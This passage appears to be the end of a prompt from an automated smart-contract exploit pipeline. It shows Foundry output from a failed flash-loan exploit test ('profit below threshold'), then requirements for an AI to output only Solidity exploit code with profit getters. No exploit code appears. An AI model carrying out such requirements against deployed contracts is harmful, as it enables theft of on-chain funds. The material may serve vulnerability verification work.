    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x809a14563A12acb8fc257502813131cA97E6CcF1.transfer
  at FlawVerifier.receiveFlashLoan
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.attemptFlashDebtShareRoute
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.47s (3.33s CPU time)

Ran 1 test suite in 3.70s (3.47s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 158215625)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
